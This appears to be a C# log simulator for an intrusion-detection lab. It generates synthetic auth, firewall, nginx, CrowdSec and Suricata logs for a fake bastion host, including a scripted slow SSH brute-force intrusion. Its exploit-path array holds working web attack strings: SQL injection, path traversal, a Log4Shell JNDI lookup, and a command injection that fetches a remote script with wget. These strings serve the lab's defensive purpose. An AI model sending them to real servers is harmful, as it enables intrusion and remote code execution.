using System.Globalization;
using XrCopilotLab.Intrusion.Mcp.Core.Sources;

namespace XrCopilotLab.Intrusion.Mcp.Core.Simulation;

/// <summary>Settings of the simulated host (<c>Simulation:*</c>).</summary>
public sealed class SimulationOptions
{
    public const string SectionName = "Simulation";

    /// <summary>The host name written in the simulated syslog lines.</summary>
    public string Hostname { get; set; } = "bastion-01";

    /// <summary>Same seed, same days: two replicas, or a restart, tell the same story.</summary>
    public int Seed { get; set; } = 20261110;

    /// <summary>How many days back the simulated logs go.</summary>
    public int Days { get; set; } = 30;

    /// <summary>The host's time zone (IANA id): the logs are written in local time.</summary>
    public string TimeZone { get; set; } = "Europe/Rome";

    /// <summary>Every how many days the night-time intrusion happens. 1 = every night.</summary>
    public int IncidentEveryDays { get; set; } = 1;
}

/// <summary>The lines one simulated day wrote to the five logs.</summary>
public sealed record SimulatedDay(
    DateOnly Day,
    IReadOnlyList<string> Fail2banLines,
    IReadOnlyList<string> AuthLines,
    IReadOnlyList<string> FirewallLines,
    IReadOnlyList<string> WebAccessLines,
    IReadOnlyList<string> CrowdsecLines,
    IReadOnlyList<string> SuricataLines)
{
    public LogSet ToLogSet() => new(Fail2banLines, AuthLines, FirewallLines, WebAccessLines, CrowdsecLines, SuricataLines);
}

/// <summary>
/// A synthetic Linux host exposed on the internet with SSH and nginx, behind UFW, protected by fail2ban, with CrowdSec
/// running in detection mode (alerts and decisions, no bouncer). For any day it generates the lines that day would
/// have left in <c>auth.log</c>, <c>fail2ban.log</c>, <c>ufw.log</c>, the nginx <c>access.log</c> and
/// <c>crowdsec.log</c> and Suricata's <c>eve.json</c>, and runs the fail2ban rules on them (maxretry, findtime, bantime, recidive), so bans follow
/// from the attempts. Deterministic and pure: same seed and day, same lines; no clock, no I/O.
/// <para>What a day contains:</para>
/// <list type="bullet">
/// <item>SSH brute force from 25-45 addresses (most get banned), web vulnerability scans, web login brute force,
/// web exploit attempts (SQL injection, path traversal, Log4Shell, PHPUnit, command injection);</item>
/// <item>every fourth day a request flood on the site;</item>
/// <item>a distributed campaign on one account, from 14-25 home connections, each under the ban threshold;</item>
/// <item>one address banned three times, then by the recidive jail for a week;</item>
/// <item>firewall noise on closed ports, 2-4 port scans, one probe of industrial control ports (Modbus, S7, IEC 104…);</item>
/// <item>the intrusion: at 00:31 a port scan from 198.51.100.213; from 00:52 one SSH try every three minutes on
/// <c>operatore</c>, slow enough that fail2ban never bans; around 01:25 CrowdSec raises <c>ssh-slow-bf</c>, which
/// nothing enforces; around 02:50 the password is right; 15-25 minutes later the host starts calling a malware
/// controller every ten minutes, which Suricata reports as an outbound alert;</item>
/// <item>Suricata alerts: SSH attackers on public reputation lists, a few attempts at an OpenSSH exploit, and
/// low-priority engine events that must not be reported. Signature names follow ET Open's style; the signature ids are
/// in a synthetic range (9 000 000+) and are not real rule ids;</item>
/// <item>legitimate logins and ordinary web traffic, which must not be reported.</item>
/// </list>
/// </summary>
public sealed class SyntheticHost(SimulationOptions options)
{
    /// <summary>Last octet of 198.51.100.x below which addresses are the company's own (Italy).</summary>
    public const int LegitimateTop = 30;

    /// <summary>198.51.100.213: the address of the night-time intrusion.</summary>
    public const int IncidentOctet = 213;

    public const string IncidentIp = "198.51.100.213";
    public const string IncidentUser = "operatore";
    public const string OfficeIp = "198.51.100.9";
    public const string AdminIp = "198.51.100.10";
    public const string BackupIp = "198.51.100.12";

    /// <summary>The host's address behind the NAT, in the DMZ.</summary>
    public const string HostAddress = "10.30.0.15";

    private static readonly int[] OpenPorts = [22, 80, 443];

    private static readonly string[] ValidUsers = ["root", "deploy", "operatore", "m.ferri", "backup"];

    private static readonly string[] AttackUsers =
    [
        "root", "root", "root", "admin", "admin", "test", "ubuntu", "user", "oracle", "postgres", "git", "ftpuser",
        "guest", "pi", "support", "administrator", "operator", "vpn", "scada", "hmi", "engineer", "backup", "deploy",
    ];

    private static readonly string[] CampaignUsers = ["admin", "scada", "engineer", "vpn"];

    private static readonly string[] ScanPaths =
    [
        "/.env", "/.env.production", "/.git/config", "/wp-login.php", "/wp-admin/setup-config.php", "/xmlrpc.php",
        "/phpmyadmin/index.php", "/pma/index.php", "/actuator/env", "/server-status", "/backup.sql", "/db.sql.gz",
        "/shell.php", "/cmd.php", "/cgi-bin/luci", "/boaform/admin/formLogin", "/admin/config.bak", "/site.zip",
    ];

    private static readonly (string Path, string Rule)[] ExploitPaths =
    [
        ("/index.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", "sql-injection"),
        ("/products?cat=2%27%20OR%20%271%27=%271", "sql-injection"),
        ("/download?file=../../../../etc/passwd", "path-traversal"),
        ("/static/..%2f..%2f..%2f..%2fetc/passwd", "path-traversal"),
        ("/?x=%24%7Bjndi:ldap://198.51.100.250:1389/Exploit%7D", "log4shell"),
        ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "phpunit-rce"),
        ("/api/ping?host=127.0.0.1;wget%20http://203.0.113.250/x.sh", "command-injection"),
    ];

    private static readonly string[] ScannerAgents =
    [
        "Mozilla/5.0 zgrab/0.x",
        "python-requests/2.31.0",
        "Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))",
        "curl/8.5.0",
        "Go-http-client/1.1",
    ];

    private const string BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36";
    private const string CrawlerAgent = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";

    private static readonly int[] BackgroundPorts = [23, 23, 23, 2323, 3389, 3389, 445, 445, 5900, 8080, 8443, 1433, 3306, 6379, 25, 5555, 9200, 27017, 11211, 21];

    private static readonly (int Port, string Proto)[] IndustrialProbe =
        [(502, "TCP"), (102, "TCP"), (2404, "TCP"), (20000, "TCP"), (44818, "TCP"), (4840, "TCP"), (1911, "TCP"), (47808, "UDP"), (1883, "TCP")];

    private static readonly Jail Sshd = new("sshd", MaxRetry: 5, FindTime: TimeSpan.FromMinutes(10), BanTime: TimeSpan.FromHours(1));
    private static readonly Jail HttpAuth = new("nginx-http-auth", 5, TimeSpan.FromMinutes(10), TimeSpan.FromHours(1));
    private static readonly Jail BotSearch = new("nginx-botsearch", 3, TimeSpan.FromMinutes(10), TimeSpan.FromHours(1));
    private static readonly Jail LimitReq = new("nginx-limit-req", 10, TimeSpan.FromMinutes(1), TimeSpan.FromMinutes(10));
    private static readonly Jail Recidive = new("recidive", 3, TimeSpan.FromDays(1), TimeSpan.FromDays(7));

    private const int Fail2banPid = 812;
    private const string CrowdsecMachine = "5ac0d2f1e8a94c4a";
    private const int SlowBruteForceAlertAt = 10;

    private readonly SyntheticGeo _geo = new();

    public SimulationOptions Options { get; } = options;

    public SimulatedDay Generate(DateOnly day)
    {
        var rng = new Random(unchecked(Options.Seed * 31 + day.DayNumber * 7919));
        var start = day.ToDateTime(TimeOnly.MinValue);
        var attempts = new List<Attempt>();
        var probes = new List<Probe>();
        var incident = Options.IncidentEveryDays > 0 && day.DayNumber % Options.IncidentEveryDays == 0;

        SshNoise(rng, start, attempts);
        WebScans(rng, start, attempts);
        WebLogins(rng, start, attempts);
        WebExploits(rng, start, attempts);
        if (day.DayNumber % 4 == 1) Flood(rng, start, attempts);
        Campaign(rng, day, start, attempts);
        RepeatOffender(rng, start, attempts);
        if (incident) Intrusion(rng, start, attempts);
        Legitimate(rng, day, start, attempts);
        FirewallNoise(rng, start, probes);
        PortScans(rng, start, probes);
        IndustrialScan(rng, start, probes);
        if (incident) Reconnaissance(rng, start, probes);

        var zone = TimeZoneInfo.FindSystemTimeZoneById(Options.TimeZone);
        var w = new Writer(zone, start);

        foreach (var group in attempts.GroupBy(a => a.Service))
            RunJail(group.Key, group.OrderBy(a => a.At).ToList(), rng, w);
        RunRecidive(w);
        WriteFirewall(probes.OrderBy(p => p.At).ToList(), rng, w);
        OrdinaryTraffic(rng, start, w);

        // Suricata draws from its own generator, so adding it left every other line of the day as it was.
        Suricata(new Random(unchecked(Options.Seed * 17 + day.DayNumber * 104_729)), attempts, w);

        return new SimulatedDay(day, w.Fail2ban.Sorted(), w.Auth.Sorted(), w.Firewall.Sorted(), w.Web.Sorted(), w.Crowdsec.Sorted(), w.Suricata.Sorted());
    }

    // ---- scenarios: attempts against the services ------------------------------------------------------------------

    private static void SshNoise(Random rng, DateTime day, List<Attempt> into)
    {
        var count = rng.Next(25, 46);
        for (var i = 0; i < count; i++)
        {
            var ip = $"203.0.113.{rng.Next(1, 240)}";
            var at = day.AddSeconds(rng.Next(0, 86_000));
            var tries = rng.Next(2, 15);
            for (var k = 0; k < tries; k++)
            {
                into.Add(new Attempt(at, ip, Service.Ssh, AttackUsers[rng.Next(AttackUsers.Length)], Port(rng)));
                at = at.AddSeconds(rng.Next(2, 26));
            }
        }
    }

    private static void WebScans(Random rng, DateTime day, List<Attempt> into)
    {
        var count = rng.Next(8, 17);
        for (var i = 0; i < count; i++)
        {
            var ip = $"198.51.100.{rng.Next(100, 200)}";
            var agent = ScannerAgents[rng.Next(ScannerAgents.Length)];
            var at = day.AddSeconds(rng.Next(0, 86_000));
            var n = rng.Next(2, 13);
            for (var k = 0; k < n; k++)
            {
                into.Add(new Attempt(at, ip, Service.WebScan, null, 0, Path: ScanPaths[rng.Next(ScanPaths.Length)], Status: 404, Agent: agent));
                at = at.AddSeconds(rng.Next(1, 10));
            }
        }
    }

    private static void WebLogins(Random rng, DateTime day, List<Attempt> into)
    {
        var count = rng.Next(2, 7);
        for (var i = 0; i < count; i++)
        {
            var ip = $"203.0.113.{rng.Next(1, 240)}";
            var at = day.AddSeconds(rng.Next(0, 86_000));
            var n = rng.Next(4, 26);
            for (var k = 0; k < n; k++)
            {
                into.Add(new Attempt(at, ip, Service.WebAuth, null, 0, Path: "/admin/", Status: 401, Agent: "python-requests/2.31.0"));
                at = at.AddSeconds(rng.Next(3, 22));
            }
        }
    }

    /// <summary>Requests that carry an exploit. No fail2ban jail matches them: only nginx and CrowdSec see them.</summary>
    private static void WebExploits(Random rng, DateTime day, List<Attempt> into)
    {
        var count = rng.Next(3, 7);
        for (var i = 0; i < count; i++)
        {
            var ip = $"203.0.113.{rng.Next(1, 240)}";
            var agent = ScannerAgents[rng.Next(ScannerAgents.Length)];
            var at = day.AddSeconds(rng.Next(0, 86_000));
            var n = rng.Next(2, 9);
            for (var k = 0; k < n; k++)
            {
                var (path, rule) = ExploitPaths[rng.Next(ExploitPaths.Length)];
                into.Add(new Attempt(at, ip, Service.WebExploit, null, 0, Path: path, Status: rng.Next(2) == 0 ? 400 : 404, Agent: agent, Rule: rule));
                at = at.AddSeconds(rng.Next(1, 6));
            }
        }
    }

    private static void Flood(Random rng, DateTime day, List<Attempt> into)
    {
        var count = rng.Next(1, 3);
        for (var i = 0; i < count; i++)
        {
            var ip = $"198.51.100.{rng.Next(100, 200)}";
            var at = day.AddHours(rng.Next(9, 20)).AddMinutes(rng.Next(60));
            var n = rng.Next(40, 81);
            for (var k = 0; k < n; k++)
            {
                into.Add(new Attempt(at, ip, Service.WebFlood, null, 0, Path: "/login", Status: 429, Agent: "Go-http-client/1.1"));
                at = at.AddSeconds(rng.Next(0, 4));
            }
        }
    }

    /// <summary>One account, many home connections, one to three tries each spread over hours: never five in ten minutes.</summary>
    private static void Campaign(Random rng, DateOnly date, DateTime day, List<Attempt> into)
    {
        var user = CampaignUsers[date.DayNumber % CampaignUsers.Length];
        var count = rng.Next(14, 26);
        for (var i = 0; i < count; i++)
        {
            var ip = $"192.0.2.{rng.Next(1, 255)}";
            var at = day.AddMinutes(rng.Next(0, 20 * 60));
            var tries = rng.Next(1, 4);
            for (var k = 0; k < tries; k++)
            {
                into.Add(new Attempt(at, ip, Service.Ssh, user, Port(rng)));
                at = at.AddMinutes(rng.Next(15, 61));
            }
        }
    }

    /// <summary>Three bursts in a day from one address: three sshd bans, then a week in the recidive jail.</summary>
    private static void RepeatOffender(Random rng, DateTime day, List<Attempt> into)
    {
        var ip = $"203.0.113.{rng.Next(240, 255)}";
        foreach (var at in new[] { day.AddHours(1).AddMinutes(10), day.AddHours(5).AddMinutes(40), day.AddHours(11).AddMinutes(20) })
        {
            var t = at.AddSeconds(rng.Next(0, 300));
            for (var k = 0; k < 6; k++)
            {
                into.Add(new Attempt(t, ip, Service.Ssh, AttackUsers[rng.Next(AttackUsers.Length)], Port(rng)));
                t = t.AddSeconds(rng.Next(3, 15));
            }
        }
    }

    /// <summary>
    /// The intrusion fail2ban does not see: one try every 160-230 s keeps five failures more than ten minutes apart,
    /// so the address is never banned; after about two hours the password is right.
    /// </summary>
    private static void Intrusion(Random rng, DateTime day, List<Attempt> into)
    {
        var at = day.AddMinutes(52).AddSeconds(rng.Next(0, 60));
        var failures = rng.Next(32, 41);
        for (var k = 0; k < failures; k++)
        {
            into.Add(new Attempt(at, IncidentIp, Service.Ssh, IncidentUser, Port(rng)));
            at = at.AddSeconds(rng.Next(160, 231));
        }
        into.Add(new Attempt(at, IncidentIp, Service.Ssh, IncidentUser, Port(rng), Success: true, Method: "password"));
    }

    private static void Legitimate(Random rng, DateOnly date, DateTime day, List<Attempt> into)
    {
        into.Add(new Attempt(day.AddHours(3).AddSeconds(rng.Next(0, 120)), BackupIp, Service.Ssh, "backup", Port(rng), Success: true, Method: "publickey"));
        if (date.DayOfWeek is DayOfWeek.Saturday or DayOfWeek.Sunday) return;

        foreach (var hour in new[] { 8, 13, 17 })
            into.Add(new Attempt(day.AddHours(hour).AddMinutes(rng.Next(0, 50)), OfficeIp, Service.Ssh, "deploy", Port(rng), Success: true, Method: "publickey"));

        var admin = day.AddHours(9).AddMinutes(rng.Next(0, 40));
        into.Add(new Attempt(admin, AdminIp, Service.Ssh, "m.ferri", Port(rng)));
        into.Add(new Attempt(admin.AddSeconds(rng.Next(6, 20)), AdminIp, Service.Ssh, "m.ferri", Port(rng), Success: true, Method: "password"));
    }

    // ---- scenarios: connections to closed ports (UFW) ----------------------------------------------------------------

    private static void FirewallNoise(Random rng, DateTime day, List<Probe> into)
    {
        var count = rng.Next(150, 251);
        for (var i = 0; i < count; i++)
        {
            var ip = rng.Next(2) == 0 ? $"203.0.113.{rng.Next(1, 240)}" : $"192.0.2.{rng.Next(1, 255)}";
            into.Add(new Probe(day.AddSeconds(rng.Next(0, 86_400)), ip, BackgroundPorts[rng.Next(BackgroundPorts.Length)], "TCP"));
        }
    }

    private static void PortScans(Random rng, DateTime day, List<Probe> into)
    {
        var count = rng.Next(2, 5);
        for (var i = 0; i < count; i++)
            Sweep(rng, into, $"198.51.100.{rng.Next(100, 200)}", day.AddSeconds(rng.Next(0, 86_000)), rng.Next(40, 201));
    }

    /// <summary>Somebody looking for plant systems: the ports of Modbus, S7, IEC 104, DNP3, EtherNet/IP, OPC UA, BACnet.</summary>
    private static void IndustrialScan(Random rng, DateTime day, List<Probe> into)
    {
        var ip = $"203.0.113.{rng.Next(1, 240)}";
        var at = day.AddHours(rng.Next(0, 24)).AddMinutes(rng.Next(60));
        foreach (var (port, proto) in IndustrialProbe)
        {
            into.Add(new Probe(at, ip, port, proto));
            at = at.AddMilliseconds(rng.Next(200, 2500));
        }
    }

    /// <summary>The intruder maps the host twenty minutes before trying SSH.</summary>
    private static void Reconnaissance(Random rng, DateTime day, List<Probe> into) =>
        Sweep(rng, into, IncidentIp, day.AddMinutes(31).AddSeconds(rng.Next(0, 30)), 30);

    private static void Sweep(Random rng, List<Probe> into, string ip, DateTime at, int ports)
    {
        var seen = new HashSet<int>(OpenPorts);
        // A scan starts from the well-known ports, then wanders.
        foreach (var port in BackgroundPorts.Distinct().Concat(Enumerable.Range(0, ports * 2).Select(_ => rng.Next(1, 65536))))
        {
            if (!seen.Add(port)) continue;
            into.Add(new Probe(at, ip, port, "TCP"));
            at = at.AddMilliseconds(rng.Next(150, 1500));
            if (seen.Count - OpenPorts.Length >= ports) break;
        }
    }

    // ---- fail2ban, nginx and CrowdSec emulation ---------------------------------------------------------------------

    private void RunJail(Service service, List<Attempt> attempts, Random rng, Writer w)
    {
        var jail = JailOf(service);
        var windows = new Dictionary<string, Queue<DateTime>>();
        var bannedUntil = new Dictionary<string, DateTime>();
        var failures = new Dictionary<string, List<DateTime>>();
        var exploitRules = new Dictionary<string, List<string>>();

        foreach (var a in attempts)
        {
            // A banned address is dropped by the firewall: the service never sees the attempt.
            if (bannedUntil.TryGetValue(a.Ip, out var until) && a.At < until) continue;

            if (service == Service.Ssh) WriteAuth(a, rng, w);
            else WriteAccess(a, rng, w);
            if (a.Success) continue;

            if (!failures.TryGetValue(a.Ip, out var mine)) failures[a.Ip] = mine = [];
            mine.Add(a.At);

            if (service == Service.Ssh && a.Ip == IncidentIp && mine.Count == SlowBruteForceAlertAt)
                Crowdsec(w, a.At.AddMilliseconds(300), a.Ip, "crowdsecurity/ssh-slow-bf", mine.Count + 1, a.At - mine[0]);

            if (service == Service.WebExploit)
            {
                if (!exploitRules.TryGetValue(a.Ip, out var rules)) exploitRules[a.Ip] = rules = [];
                rules.Add(a.Rule!);
                if (rules.Count == 2) Crowdsec(w, a.At.AddMilliseconds(200), a.Ip, ExploitScenario(rules[0]), 2, a.At - mine[0]);
                continue;
            }
            if (jail is null) continue;

            var found = a.At.AddMilliseconds(rng.Next(5, 900));
            w.Fail2ban.Add(found, F2b(found, "filter", "INFO", jail.Name, $"Found {a.Ip} - {a.At:yyyy-MM-dd HH:mm:ss}"));

            if (!windows.TryGetValue(a.Ip, out var window)) windows[a.Ip] = window = new Queue<DateTime>();
            window.Enqueue(a.At);
            while (window.Count > 0 && a.At - window.Peek() > jail.FindTime) window.Dequeue();
            if (window.Count < jail.MaxRetry) continue;

            var span = a.At - window.Peek();
            window.Clear();
            var ban = found.AddMilliseconds(rng.Next(100, 900));
            var unban = ban + jail.BanTime;
            bannedUntil[a.Ip] = unban;
            w.Fail2ban.Add(ban, F2b(ban, "actions", "NOTICE", jail.Name, $"Ban {a.Ip}"));
            w.Fail2ban.Add(unban, F2b(unban, "actions", "NOTICE", jail.Name, $"Unban {a.Ip}"));
            w.Bans.Add((ban, a.Ip));

            var scenario = service switch
            {
                Service.Ssh => "crowdsecurity/ssh-bf",
                Service.WebScan => a.Path is { } p && (p.Contains(".env", StringComparison.Ordinal) || p.Contains(".git", StringComparison.Ordinal))
                    ? "crowdsecurity/http-sensitive-files" : "crowdsecurity/http-probing",
                Service.WebAuth => "crowdsecurity/http-generic-bf",
                _ => "crowdsecurity/http-crawl-non_statics",
            };
            Crowdsec(w, ban.AddMilliseconds(250), a.Ip, scenario, jail.MaxRetry + 1, span);
        }
    }

    /// <summary>The recidive jail reads fail2ban's own Ban lines: three within a day, a week's ban.</summary>
    private static void RunRecidive(Writer w)
    {
        foreach (var byIp in w.Bans.GroupBy(b => b.Ip))
        {
            var window = new Queue<DateTime>();
            foreach (var (at, ip) in byIp.OrderBy(b => b.At))
            {
                var found = at.AddMilliseconds(400);
                w.Fail2ban.Add(found, F2b(found, "filter", "INFO", Recidive.Name, $"Found {ip} - {at:yyyy-MM-dd HH:mm:ss}"));
                window.Enqueue(at);
                while (window.Count > 0 && at - window.Peek() > Recidive.FindTime) window.Dequeue();
                if (window.Count < Recidive.MaxRetry) continue;

                window.Clear();
                var ban = found.AddSeconds(1);
                w.Fail2ban.Add(ban, F2b(ban, "actions", "NOTICE", Recidive.Name, $"Ban {ip}"));
                w.Fail2ban.Add(ban + Recidive.BanTime, F2b(ban + Recidive.BanTime, "actions", "NOTICE", Recidive.Name, $"Unban {ip}"));
            }
        }
    }

    private void WriteFirewall(List<Probe> probes, Random rng, Writer w)
    {
        foreach (var p in probes)
        {
            var uptime = 812_000 + (p.At - p.At.Date).TotalSeconds + p.At.Date.DayNumber() % 7 * 86_400;
            var tail = p.Proto == "UDP" ? "LEN=24" : "WINDOW=1024 RES=0x00 SYN URGP=0";
            var len = p.Proto == "UDP" ? 44 : rng.Next(2) == 0 ? 44 : 60;
            w.Firewall.Add(p.At, Syslog(p.At, w.Zone, "kernel", null, string.Create(CultureInfo.InvariantCulture,
                $"[{uptime:0.000000}] [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5a:01:02:00:16:3e:00:00:01:08:00 SRC={p.Ip} DST={HostAddress} LEN={len} TOS=0x00 PREC=0x00 TTL={rng.Next(40, 250)} ID={rng.Next(1, 65535)} PROTO={p.Proto} SPT={Port(rng)} DPT={p.Port} {tail}")));
        }

        // CrowdSec reads the same log and recognises the sweeps.
        foreach (var byIp in probes.GroupBy(p => p.Ip))
        {
            var list = byIp.ToList();
            var ports = list.Select(p => p.Port).Distinct().Count();
            if (ports < 15) continue;
            var last = list[^1].At;
            Crowdsec(w, last.AddSeconds(1), byIp.Key, "crowdsecurity/iptables-scan-multi_ports", ports, last - list[0].At);
        }
    }

    /// <summary>Visitors, the office and a crawler: lines the parser must skip.</summary>
    private static void OrdinaryTraffic(Random rng, DateTime day, Writer w)
    {
        string[] pages = ["/", "/login", "/static/app.css", "/static/app.js", "/favicon.ico", "/robots.txt", "/dashboard"];
        var count = rng.Next(40, 80);
        for (var i = 0; i < count; i++)
        {
            var at = day.AddSeconds(rng.Next(0, 86_400));
            var crawler = rng.Next(5) == 0;
            var ip = crawler ? $"198.51.100.{rng.Next(100, 200)}" : $"198.51.100.{rng.Next(1, LegitimateTop)}";
            var page = pages[rng.Next(pages.Length)];
            w.Web.Add(at, Access(at, w.Zone, ip, "GET", page, 200, rng.Next(300, 40_000), crawler ? CrawlerAgent : BrowserAgent));
        }
    }

    private void WriteAuth(Attempt a, Random rng, Writer w)
    {
        var pid = rng.Next(1000, 65000);
        var at = a.At;
        var user = a.User ?? "root";
        if (a.Success)
        {
            var key = a.Method == "publickey" ? ": ED25519 SHA256:" + Fingerprint(user) : "";
            w.Auth.Add(at, Syslog(at, w.Zone, "sshd", pid, $"Accepted {a.Method} for {user} from {a.Ip} port {a.Port} ssh2{key}"));
            var opened = at.AddMilliseconds(40);
            w.Auth.Add(opened, Syslog(opened, w.Zone, "sshd", pid, $"pam_unix(sshd:session): session opened for user {user}(uid=1001) by {user}(uid=0)"));
            return;
        }

        if (Array.IndexOf(ValidUsers, user) < 0)
        {
            w.Auth.Add(at, Syslog(at, w.Zone, "sshd", pid, $"Invalid user {user} from {a.Ip} port {a.Port}"));
            at = at.AddMilliseconds(rng.Next(300, 2500));
            w.Auth.Add(at, Syslog(at, w.Zone, "sshd", pid, $"Failed password for invalid user {user} from {a.Ip} port {a.Port} ssh2"));
            at = at.AddMilliseconds(rng.Next(100, 900));
            w.Auth.Add(at, Syslog(at, w.Zone, "sshd", pid, $"Connection closed by invalid user {user} {a.Ip} port {a.Port} [preauth]"));
        }
        else
        {
            at = at.AddMilliseconds(rng.Next(300, 2500));
            w.Auth.Add(at, Syslog(at, w.Zone, "sshd", pid, $"Failed password for {user} from {a.Ip} port {a.Port} ssh2"));
            at = at.AddMilliseconds(rng.Next(100, 900));
            w.Auth.Add(at, Syslog(at, w.Zone, "sshd", pid, $"Connection closed by authenticating user {user} {a.Ip} port {a.Port} [preauth]"));
        }
    }

    private static void WriteAccess(Attempt a, Random rng, Writer w) =>
        w.Web.Add(a.At, Access(a.At, w.Zone, a.Ip, "GET", a.Path ?? "/", a.Status ?? 404, rng.Next(150, 600), a.Agent ?? "-"));

    private void Crowdsec(Writer w, DateTime local, string ip, string scenario, int events, TimeSpan span)
    {
        var stamp = Iso(local, w.Zone, fraction: false);
        var utc = new DateTimeOffset(local, w.Zone.GetUtcOffset(local)).UtcDateTime;
        w.Crowdsec.Add(local, string.Create(CultureInfo.InvariantCulture,
            $"time=\"{stamp}\" level=info msg=\"Ip {ip} performed '{scenario}' ({events} events over {GoDuration(span)}) at {utc:yyyy-MM-dd HH:mm:ss.ff} +0000 UTC\""));

        var location = _geo.Locate(ip);
        var asn = location.Network?.Split(' ')[0].TrimStart('A', 'S') ?? "0";
        var decided = local.AddMilliseconds(5);
        w.Crowdsec.Add(decided, string.Create(CultureInfo.InvariantCulture,
            $"time=\"{Iso(decided, w.Zone, fraction: false)}\" level=info msg=\"({CrowdsecMachine}/crowdsec) {scenario} by ip {ip} ({location.CountryCode}/{asn}) : 4h ban on Ip {ip}\""));
    }

    // ---- Suricata (eve.json alerts) ---------------------------------------------------------------------------------

    /// <summary>The malware controller the intruder's backdoor calls (documentation address, invented city).</summary>
    public const string ControllerIp = "203.0.113.66";

    private void Suricata(Random rng, List<Attempt> attempts, Writer w)
    {
        // Some SSH attackers are on public reputation lists: Suricata flags their first connection.
        foreach (var first in attempts.Where(a => a.Service == Service.Ssh && a.Ip.StartsWith("203.0.113.", StringComparison.Ordinal))
                     .GroupBy(a => a.Ip).Select(g => g.MinBy(a => a.At)!))
        {
            if (rng.Next(3) != 0) continue;
            var group = rng.Next(1, 100);
            Eve(w, first.At.AddMilliseconds(-40), first.Ip, first.Port, HostAddress, 22, "ssh",
                9_000_100 + group, $"ET CINS Active Threat Intelligence Poor Reputation IP group {group}", "Misc Attack", 2);
        }

        // An exploit for OpenSSH, from one or two addresses.
        for (var i = rng.Next(1, 3); i > 0; i--)
        {
            var ip = $"203.0.113.{rng.Next(1, 240)}";
            var at = w.Day.AddSeconds(rng.Next(0, 86_000));
            for (var k = rng.Next(2, 6); k > 0; k--, at = at.AddSeconds(rng.Next(20, 90)))
                Eve(w, at, ip, Port(rng), HostAddress, 22, "ssh",
                    9_000_010, "ET EXPLOIT Possible OpenSSH regreSSHion Race Condition Attempt (CVE-2024-6387)", "Attempted Administrator Privilege Gain", 1);
        }

        // Engine events: priority 3, never reported.
        for (var i = rng.Next(3, 9); i > 0; i--)
            Eve(w, w.Day.AddSeconds(rng.Next(0, 86_000)), $"203.0.113.{rng.Next(1, 240)}", Port(rng), HostAddress, 443, "tls",
                2_210_045, "SURICATA STREAM Packet with invalid ack", "Generic Protocol Command Decode", 3);

        // The intrusion goes on: the backdoor calls its controller every ten minutes until morning.
        var login = attempts.FirstOrDefault(a => a.Ip == IncidentIp && a.Success);
        if (login is null) return;
        var end = login.At.Date.AddHours(7);
        for (var at = login.At.AddMinutes(rng.Next(15, 26)); at < end; at = at.AddMinutes(10).AddSeconds(rng.Next(-20, 21)))
            Eve(w, at, HostAddress, Port(rng), ControllerIp, 80, "http",
                9_000_001, "ET MALWARE Linux Backdoor CnC Checkin", "A Network Trojan was detected", 1);
    }

    private static void Eve(Writer w, DateTime local, string src, int srcPort, string dest, int destPort, string appProto,
        int sid, string signature, string category, int severity)
    {
        var offset = w.Zone.GetUtcOffset(local);
        var stamp = string.Create(CultureInfo.InvariantCulture,
            $"{local:yyyy-MM-dd'T'HH:mm:ss.ffffff}{(offset < TimeSpan.Zero ? '-' : '+')}{Math.Abs(offset.Hours):00}{Math.Abs(offset.Minutes):00}");
        w.Suricata.Add(local, string.Create(CultureInfo.InvariantCulture,
            $"{{\"timestamp\":\"{stamp}\",\"flow_id\":{(long)sid * 7919 + local.Ticks % 1_000_000_007},\"in_iface\":\"eth0\",\"event_type\":\"alert\",\"src_ip\":\"{src}\",\"src_port\":{srcPort},\"dest_ip\":\"{dest}\",\"dest_port\":{destPort},\"proto\":\"TCP\",\"app_proto\":\"{appProto}\",\"alert\":{{\"action\":\"allowed\",\"gid\":1,\"signature_id\":{sid},\"rev\":1,\"signature\":\"{signature}\",\"category\":\"{category}\",\"severity\":{severity}}}}}"));
    }

    private static string ExploitScenario(string rule) => rule switch
    {
        "sql-injection" => "crowdsecurity/http-sqli-probing",
        "path-traversal" => "crowdsecurity/http-path-traversal-probing",
        "log4shell" => "crowdsecurity/apache_log4j2_cve-2021-44228",
        "phpunit-rce" => "crowdsecurity/vpatch-CVE-2017-9841",
        _ => "crowdsecurity/http-cve-probing",
    };

    private string Syslog(DateTime local, TimeZoneInfo zone, string program, int? pid, string message) =>
        $"{Iso(local, zone, fraction: true)} {Options.Hostname} {program}{(pid is null ? "" : $"[{pid}]")}: {message}";

    private static string Access(DateTime local, TimeZoneInfo zone, string ip, string method, string path, int status, int bytes, string agent)
    {
        var offset = zone.GetUtcOffset(local);
        var sign = offset < TimeSpan.Zero ? '-' : '+';
        var stamp = string.Create(CultureInfo.InvariantCulture, $"{local:dd/MMM/yyyy:HH:mm:ss} {sign}{Math.Abs(offset.Hours):00}{Math.Abs(offset.Minutes):00}");
        return string.Create(CultureInfo.InvariantCulture, $"{ip} - - [{stamp}] \"{method} {path} HTTP/1.1\" {status} {bytes} \"-\" \"{agent}\"");
    }

    private static string Iso(DateTime local, TimeZoneInfo zone, bool fraction) =>
        new DateTimeOffset(local, zone.GetUtcOffset(local))
            .ToString(fraction ? "yyyy-MM-dd'T'HH:mm:ss.ffffffzzz" : "yyyy-MM-dd'T'HH:mm:sszzz", CultureInfo.InvariantCulture);

    private static string F2b(DateTime local, string module, string level, string jail, string message) =>
        string.Create(CultureInfo.InvariantCulture,
            $"{local:yyyy-MM-dd HH:mm:ss},{local.Millisecond:000} {("fail2ban." + module),-24} [{Fail2banPid}]: {level,-7} [{jail}] {message}");

    /// <summary>A Go duration, as CrowdSec prints it: <c>21.3s</c>, <c>31m2s</c>, <c>1h2m3s</c>.</summary>
    private static string GoDuration(TimeSpan span)
    {
        if (span < TimeSpan.FromMinutes(1)) return string.Create(CultureInfo.InvariantCulture, $"{Math.Round(span.TotalSeconds, 2)}s");
        var h = (int)span.TotalHours;
        return h > 0 ? $"{h}h{span.Minutes}m{span.Seconds}s" : $"{span.Minutes}m{span.Seconds}s";
    }

    private static string Fingerprint(string user) =>
        Convert.ToBase64String(System.Security.Cryptography.SHA256.HashData(System.Text.Encoding.UTF8.GetBytes("synthetic-key-" + user))).TrimEnd('=');

